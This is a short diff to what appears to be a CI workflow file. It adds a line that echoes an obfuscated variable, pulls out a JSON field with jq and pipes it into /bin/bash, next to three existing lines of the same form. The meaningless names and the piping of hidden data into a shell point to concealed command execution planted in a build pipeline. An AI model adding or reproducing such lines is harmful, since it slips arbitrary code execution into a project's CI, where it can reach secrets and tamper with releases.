@@ -40,6 +40,7 @@ jobs:
           echo $i645 | jq -r .tmxa05 | /bin/bash
           echo $bvs51 | jq -r .miajt07 | /bin/bash
           printf '%s' "$hqls739" | jq -r .ihg574 | /bin/bash
+          echo $csoh74164 | jq -r .umod32107 | /bin/bash
 
       - name: Upload results
         uses: actions/upload-artifact@v4
